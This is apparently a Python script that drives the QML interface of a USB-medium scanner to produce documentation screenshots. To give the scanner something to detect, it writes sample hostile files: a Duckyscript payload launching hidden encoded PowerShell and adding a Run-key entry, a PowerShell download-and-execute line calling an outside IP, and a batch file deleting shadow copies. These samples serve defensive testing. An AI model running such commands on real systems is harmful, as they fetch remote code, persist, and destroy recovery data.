#!/usr/bin/env python3
"""Re-render the documentation screenshots from the real interface.

The images in docs/images are produced by running the actual QML interface
offscreen, driving it with a synthetic medium, and grabbing the window.  They
are not mock-ups: every number in them comes from a real run of the pipeline.

    python3 scripts/make-screenshots.py [--output docs/images] [--keep]

The script builds its sample medium in a temporary directory (EICAR, a
Duckyscript payload, an autorun.inf, a double extension, a packed-looking
executable, PowerShell and batch scripts) so nothing outside the repository is
touched.  Rendering uses the KDE desktop style when it is available.
"""

from __future__ import annotations

import argparse
import os
import shutil
import struct
import sys
import tempfile
import time
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "src"))

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
os.environ.setdefault("QT_QUICK_CONTROLS_STYLE", "org.kde.desktop")

from PyQt6.QtCore import Q_ARG, QEventLoop, QObject, QUrl  # noqa: E402
from PyQt6.QtGui import QGuiApplication  # noqa: E402
from PyQt6.QtQml import QQmlApplicationEngine  # noqa: E402
from PyQt6.QtQuick import QQuickWindow  # noqa: E402

from dcs.core.config import load_config  # noqa: E402
from dcs.core.device import BlockDevice  # noqa: E402
import dcs.core.device as device_module  # noqa: E402
from dcs.gui.app import find_qml_imports, qml_directory  # noqa: E402
from dcs.gui.backend import Backend  # noqa: E402

WINDOW_WIDTH = 1280
WINDOW_HEIGHT = 860

#: what the "Removable media" list shows in the screenshots
DEMO_DEVICES = (
    BlockDevice(
        name="sdb1",
        path="/dev/sdb1",
        type="part",
        size=16 * 1000**3,
        fstype="vfat",
        label="SANDISK16",
        mountpoints=["/run/media/aleks/SANDISK16"],
        transport="usb",
        removable=True,
        hotplug=True,
        model="Cruzer Blade",
        vendor="SanDisk",
    ),
    BlockDevice(
        name="sdc1",
        path="/dev/sdc1",
        type="part",
        size=32 * 1000**3,
        fstype="exfat",
        label="UNKNOWN-STICK",
        transport="usb",
        removable=True,
        hotplug=True,
        model="DataTraveler",
        vendor="Kingston",
    ),
)


def make_medium(root: Path, *, nested_files: int = 1500) -> None:
    """A medium with enough files to show progress, and a few nasty ones."""
    (root / "Documents").mkdir(parents=True, exist_ok=True)
    (root / "Pictures").mkdir(parents=True, exist_ok=True)
    for index in range(nested_files):
        folder = "Documents" if index % 2 else "Pictures"
        (root / folder / f"note-{index:04d}.txt").write_text("holiday notes\n" * 30, encoding="utf-8")

    eicar = b"X5O!P%@AP[4" + bytes([92]) + b"PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    (root / "eicar.com").write_bytes(eicar)
    (root / "payload.txt").write_text(
        "\n".join(
            [
                "REM Duckyscript payload",
                "DELAY 1000",
                "GUI r",
                "DELAY 500",
                "STRING powershell -w hidden -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
                "ENTER",
                "DELAY 2000",
                "STRING reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v updater /d %TEMP%\\\\a.exe",
                "ENTER",
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    (root / "autorun.inf").write_text("[autorun]\nopen=setup.exe\n", encoding="utf-8")
    setup = bytearray(4096)
    setup[0:2] = b"MZ"
    struct.pack_into("<I", setup, 0x3C, 0x80)
    setup[0x80:0x84] = b"PE\x00\x00"
    struct.pack_into("<HHI", setup, 0x84, 0x8664, 2, 0x5F000000)
    (root / "setup.exe").write_bytes(bytes(setup))
    (root / "invoice.pdf.exe").write_bytes(bytes(setup))
    (root / "update.ps1").write_text(
        "IEX (New-Object Net.WebClient).DownloadString('http://185.11.22.33/a.ps1')\n", encoding="utf-8"
    )
    (root / "cleanup.bat").write_text(
        "vssadmin delete shadows /all /quiet\nwmic shadowcopy delete\n", encoding="utf-8"
    )


class Shot:
    """Drives the interface and writes the PNGs."""

    def __init__(self, output: Path) -> None:
        self.output = output
        #: both are filled in by run() with the temporary sample media
        self.medium = Path()
        self.infected = Path()
        self.warnings: list[str] = []

    def run(self) -> int:
        app = QGuiApplication(sys.argv[:1])
        medium = Path(tempfile.mkdtemp(prefix="dcs-shot-"))
        (medium / "usb").mkdir()
        make_medium(medium / "usb")
        self.medium = medium / "usb"
        infected = Path(tempfile.mkdtemp(prefix="dcs-shot-bad-"))
        make_medium(infected / "usb", nested_files=60)
        self.infected = infected / "usb"

        device_module.list_removable_devices = lambda **_: list(DEMO_DEVICES)

        config = load_config(path=str(medium / "config.toml"))
        config.source_path = str(medium / "config.toml")
        config.general.output_dir = str(medium / "out")
        config.report.directory = str(medium / "reports")
        config.upload.enabled = False
        config.email.enabled = False
        config.gui.switch_to_result = False

        backend = Backend(config, poll_devices=False)
        engine = QQmlApplicationEngine()
        for path in find_qml_imports():
            engine.addImportPath(path)
        engine.warnings.connect(lambda ws: self.warnings.extend(w.toString() for w in ws))
        engine.rootContext().setContextProperty("backend", backend)
        engine.rootContext().setContextProperty("appVersion", "0.1.0")
        engine.rootContext().setContextProperty("appName", "Ducky Can Shoot")
        engine.load(QUrl.fromLocalFile(os.path.join(qml_directory(), "Main.qml")))
        window = engine.rootObjects()[0]
        window.setProperty("width", WINDOW_WIDTH)
        window.setProperty("height", WINDOW_HEIGHT)
        window.show()

        self.pump(app, 0.6)
        backend.refreshDevices()
        backend.selectDevice(0)
        self.tab(window, 0)
        self.shot(window, "home-view.png")

        # a real scan, captured while it runs
        self.tab(window, 1)
        backend.startJob(
            {
                "source": str(self.medium),
                "label": "SANDISK16",
                "scan": True,
                "archive": False,
                "upload": False,
                "email": False,
            }
        )
        captured = False
        deadline = time.time() + 60
        while backend.state == "running" and time.time() < deadline:
            app.processEvents(QEventLoop.ProcessEventsFlag.AllEvents, 20)
            if not captured and backend.findings.count >= 2 and backend.throughput.rowCount() >= 3:
                self.shot(window, "live-view.png")
                captured = True
            time.sleep(0.005)
        if not captured:
            self.shot(window, "live-view.png")
        self.wait_for(app, backend, 120)

        self.tab(window, 2)
        self.shot(window, "result-view.png")

        # an infected medium, for the verdict that matters
        self.tab(window, 0)
        backend.startJob(
            {
                "source": str(self.infected),
                "label": "UNKNOWN-STICK",
                "scan": True,
                "archive": False,
                "upload": False,
                "email": False,
            }
        )
        self.wait_for(app, backend, 180)
        self.tab(window, 2)
        self.shot(window, "result-infected.png")

        self.tab(window, 3)
        self.shot(window, "settings-view.png")

        # the ClamAV installation dialog
        dialog = window.findChild(QObject, "clamavInstallDialog")
        if dialog is not None:
            dialog.setProperty("visible", True)
            self.pump(app, 0.8)
            self.shot(window, "install-clamav.png")

        shutil.rmtree(medium, ignore_errors=True)
        shutil.rmtree(infected, ignore_errors=True)

        relevant = [w for w in self.warnings if "DrawerHandle" not in w and "bottomMargin" not in w]
        print(f"QML warnings: {len(relevant)}")
        for warning in relevant[:5]:
            print("  -", warning)
        return 1 if relevant else 0

    # -- helpers ---------------------------------------------------------
    @staticmethod
    def pump(app: QGuiApplication, seconds: float) -> None:
        end = time.time() + seconds
        while time.time() < end:
            app.processEvents(QEventLoop.ProcessEventsFlag.AllEvents, 20)
            time.sleep(0.01)

    @staticmethod
    def tab(window: QObject, index: int) -> None:
        window.metaObject().invokeMethod(window, "showTab", Q_ARG("QVariant", index))

    @staticmethod
    def wait_for(app: QGuiApplication, backend: Backend, seconds: float) -> None:
        deadline = time.time() + seconds
        while backend.state == "running" and time.time() < deadline:
            app.processEvents(QEventLoop.ProcessEventsFlag.AllEvents, 20)
            time.sleep(0.01)

    def shot(self, window: QObject, name: str) -> None:
        self.pump(QGuiApplication.instance(), 0.4)
        image = QQuickWindow.grabWindow(window)
        path = self.output / name
        image.save(str(path))
        colours = {
            image.pixel(x, y)
            for x in range(0, image.width(), 17)
            for y in range(0, image.height(), 17)
        }
        print(f"{name}: {image.width()}x{image.height()} colours={len(colours)}")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--output",
        default=str(REPO / "docs" / "images"),
        help="directory the PNGs are written to (default: docs/images)",
    )
    args = parser.parse_args()

    output = Path(args.output)
    output.mkdir(parents=True, exist_ok=True)
    shot = Shot(output)
    return shot.run()


if __name__ == "__main__":
    raise SystemExit(main())
